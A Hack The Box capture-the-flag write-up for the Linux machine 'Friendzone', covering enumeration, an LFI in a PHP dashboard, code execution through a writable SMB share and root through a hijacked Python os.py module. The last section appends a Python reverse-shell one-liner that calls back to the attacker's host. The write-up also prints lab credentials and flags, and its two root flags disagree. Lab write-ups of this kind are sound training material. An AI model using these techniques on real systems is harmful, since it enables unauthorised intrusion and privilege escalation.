---

title: 🟢 HTB - Friendzone
author: Acivik
date: 2025-01-24 20:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Friendzone, walkthrough, easy, linux]

---

![https://i.ibb.co/6DBYWWy/Friend-Zone.png](https://i.ibb.co/6DBYWWy/Friend-Zone.png)

---

# <span style="color:#AA0E1C"><b># System Info & Credentials</b></span>

| **IP:** | **10.10.10.123** |
| --- | --- |
| **OS:** | **Ubuntu 18.04** |
| **Hosts:** | **friendzone.red
administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red** |
| **Credentials:** | admin:WORKWORKHhallelujah@#

db_user/system_user=friend
db_pass/system_userpw=Agpyu12!0.213$ |
| **Flags:** | **(user.txt) : a4b772766271fc2f9a0c67268dffa063
(root.txt) : 89388f7816b6674f0fe4b6f870d80b7f**  |

# <span style="color:#AA0E1C"><b># Nmap Result</b></span>

```bash
root@kali:~/HTB/friendzone# nmap -p- -sT 10.10.10.123 --min-rate 10000 -sVC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 18:36 UTC
Warning: 10.10.10.123 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.123 (10.10.10.123)
Host is up (0.085s latency).
Not shown: 63739 closed tcp ports (conn-refused), 1789 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2025-01-16T20:36:43+02:00
| smb2-time: 
|   date: 2025-01-16T18:36:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.84 seconds
(tools) root@kali:~/HTB/friendzone#
```

# <span style="color:#AA0E1C"><b># Open Ports & To-Do</b></span>

| 21/tcp FTP | vsftpd 3.0.3 | Try Anonymous Login |
| --- | --- | --- |
| 22/tcp SSH | Apache/2.2.12 | Need Credentials |
| 53/tcp domain | 9.11.3-1ubuntu1.2 | DNS Enumeration |
| 80/tcp HTTP | Apache httpd 2.4.29 | Web Enumeration |
| 139/445 tcp SMB | smbd 4.7.6-Ubuntu | SMB Enumeration |
| 443/tcp HTTPS | Apache httpd 2.4.29 | Web Enumeration |

# <span style="color:#AA0E1C"><b># Enumeration Notes</b></span>

## <span style="color:#0096FF">SMB - 139/445 TCP:</span>

```bash
root@kali:~/HTB/friendzone# nxc smb 10.10.10.123 -u guest -p '' --shares
SMB         10.10.10.123    445    FRIENDZONE       [*] Unix - Samba (name:FRIENDZONE) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.10.123    445    FRIENDZONE       [+] \guest: (Guest)
SMB         10.10.10.123    445    FRIENDZONE       [*] Enumerated shares
SMB         10.10.10.123    445    FRIENDZONE       Share           Permissions     Remark
SMB         10.10.10.123    445    FRIENDZONE       -----           -----------     ------
SMB         10.10.10.123    445    FRIENDZONE       print$                          Printer Drivers
SMB         10.10.10.123    445    FRIENDZONE       Files                           FriendZone Samba Server Files /etc/Files
SMB         10.10.10.123    445    FRIENDZONE       general         READ            FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       Development     READ,WRITE      FriendZone Samba Server Files
SMB         10.10.10.123    445    FRIENDZONE       IPC$                            IPC Service (FriendZone server (Samba, Ubuntu))
root@kali:~/HTB/friendzone#
```

```bash
root@kali:~/HTB/friendzone# smbclient //10.10.10.123/general
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 16 20:10:51 2019
  ..                                  D        0  Tue Sep 13 14:56:24 2022
  creds.txt                           N       57  Tue Oct  9 23:52:42 2018

		3545824 blocks of size 1024. 1457128 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \>

root@kali:~/HTB/friendzone# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#

root@kali:~/HTB/friendzone#
```

## <span style="color:#0096FF">DNS - 53 TCP/UDP</span>

```bash
root@kali:~/HTB/friendzone# dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.19.21-1+b1-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 60 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Thu Jan 16 19:17:54 UTC 2025
;; XFR size: 8 records (messages 1, bytes 289)

root@kali:~/HTB/friendzone#
```

## <span style="color:#0096FF">HTTP - friendzone.red</span>

![https://i.ibb.co/VBRkv05/resim-2025-01-23-181503808.png](https://i.ibb.co/VBRkv05/resim-2025-01-23-181503808.png)

### <span style="color:#FFC300">Directory & Files</span>

```bash
root@kali:~/HTB/friendzone# dirsearch -u http://friendzone.red/ -i 200

Target: http://friendzone.red/

[15:22:03] Starting: 
[15:22:43] 200 -   11KB - /index.bak
[15:23:02] 200 -   13B  - /robots.txt
[15:23:19] 200 -  402B  - /wordpress/

Task Completed
root@kali:~/HTB/friendzone#
```

`/index.bak` → html codes of apache default page

`/robots.txt` → message: “seriously ?!”

`/wordpress/` → is an empty directory.

## <span style="color:#0096FF">HTTPS- friendzone.red</span>

![https://i.ibb.co/NLPF13X/resim-2025-01-23-190408740.png](https://i.ibb.co/NLPF13X/resim-2025-01-23-190408740.png)

source-code:

```bash
<title>FriendZone escape software</title>

<br>
<br>

<center><h2>Ready to escape from friend zone !</h2></center>

<center><img src="e.gif"></center>

<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->

```

`/js/js`

![https://i.ibb.co/64YNhH7/resim-2025-01-23-190550662.png](https://i.ibb.co/64YNhH7/resim-2025-01-23-190550662.png)

source-code:

```bash
<p>Testing some functions !</p><p>I'am trying not to break things !</p>SFV1MEhNb0gzMDE3Mzc2NDgzMzFCQWN6eHRvcmlr<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

## <span style="color:#0096FF">HTTPS- uploads.friendzone.red</span>

![https://i.ibb.co/VMJmT1t/resim-2025-01-23-194210349.png](https://i.ibb.co/VMJmT1t/resim-2025-01-23-194210349.png)

### <span style="color:#FFC300">Directory & Files</span>

```bash
200      GET        1l        8w       38c https://uploads.friendzone.red/upload.php
200      GET       13l       35w      391c https://uploads.friendzone.red/
301      GET        9l       28w      334c https://uploads.friendzone.red/files => https://uploads.friendzone.red/files/

```

`/upload.php` source code:

```bash
WHAT ARE YOU TRYING TO DO HOOOOOOMAN !
```

There is nothing useful. Empty.

There has been nothing significant on the websites so far.

## <span style="color:#0096FF">HTTPS - administrator1.friendzone.red</span>

![https://i.ibb.co/82W8PM8/resim-2025-01-23-190926299.png](https://i.ibb.co/82W8PM8/resim-2025-01-23-190926299.png)

`admin:WORKWORKHhallelujah@#`

![https://i.ibb.co/Bn9yKrz/resim-2025-01-23-181112112.png](https://i.ibb.co/Bn9yKrz/resim-2025-01-23-181112112.png)

```bash
/dashboard.php?image_id=a.jpg&pagename=timestamp
```

![https://i.ibb.co/z5dYR6G/resim-2025-01-23-191311301.png](https://i.ibb.co/z5dYR6G/resim-2025-01-23-191311301.png)

### <span style="color:#FFC300">Directory & Files</span>

```bash
200      GET        1l        2w        7c https://administrator1.friendzone.red/login.php
200      GET      122l      307w     2873c https://administrator1.friendzone.red/
301      GET        9l       28w      349c https://administrator1.friendzone.red/images => https://administrator1.friendzone.red/images/
200      GET        1l       12w      101c https://administrator1.friendzone.red/dashboard.php
200      GET        1l        5w       36c https://administrator1.friendzone.red/timestamp.php

```

# <span style="color:#AA0E1C"><b># Vulnerabilities</b></span>

### <span style="color:#FFC300">LFI - Local File Inclusion</span>

```bash
/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login

PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K 
```

`dashboard.php`  source-code

```bash
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

# <span style="color:#AA0E1C"><b># Foothold</b></span>

```bash
root@kali:~/HTB/friendzone# echo '<?php phpinfo()?>' > phpinfo.php
root@kali:~/HTB/friendzone# smbclient //10.10.10.123/Development
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put phpinfo.php
putting file phpinfo.php as \phpinfo.php (0.1 kb/s) (average 0.1 kb/s)
smb: \>
```

```bash
/dashboard.php?image_id=a.jpg&pagename=/etc/Development/phpinfo
```

![https://i.ibb.co/02c5wKb/resim-2025-01-23-200413825.png](https://i.ibb.co/02c5wKb/resim-2025-01-23-200413825.png)

# <span style="color:#AA0E1C"><b># Privilege Escalation</b></span>

## <span style="color:#0096FF">www-data → friend</span>

```bash
www-data@FriendZone:/var/www$ ls -l
total 28
drwxr-xr-x 3 root root 4096 Sep 13  2022 admin
drwxr-xr-x 4 root root 4096 Sep 13  2022 friendzone
drwxr-xr-x 2 root root 4096 Sep 13  2022 friendzoneportal
drwxr-xr-x 2 root root 4096 Sep 13  2022 friendzoneportaladmin
drwxr-xr-x 3 root root 4096 Sep 13  2022 html
-rw-r--r-- 1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x 3 root root 4096 Sep 13  2022 uploads
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$
```

## <span style="color:#0096FF">friend → root</span>

```bash
2025/01/23 19:10:16 CMD: UID=0     PID=1      | /sbin/init splash 
2025/01/23 19:11:24 CMD: UID=0     PID=2589   | /usr/sbin/exim4 -qG 
2025/01/23 19:12:01 CMD: UID=0     PID=2595   | /usr/bin/python /opt/server_admin/reporter.py 
2025/01/23 19:12:01 CMD: UID=0     PID=2594   | /bin/sh -c /opt/server_admin/reporter.py 
2025/01/23 19:12:01 CMD: UID=0     PID=2593   | /usr/sbin/CRON -f
```

```bash
friend@FriendZone:/tmp$ ls -l /opt/server_admin/reporter.py
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
friend@FriendZone:/tmp$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
friend@FriendZone:/tmp$
```

we cannot write to this file but `import os` is important for we.

module file is writable.

```bash
friend@FriendZone:/tmp$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/tmp$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 26119 Jan 23 19:19 /usr/lib/python2.7/os.py
friend@FriendZone:/opt$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",1313));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /usr/lib/python2.7/os.py
friend@FriendZone:/opt$
```

```bash
root@kali:~/HTB/friendzone# nc -lnvp 1313
listening on [any] 1313 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.123] 52092
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
bb0bad821f54e38a53154debb1f9eb4d
root@FriendZone:~#
```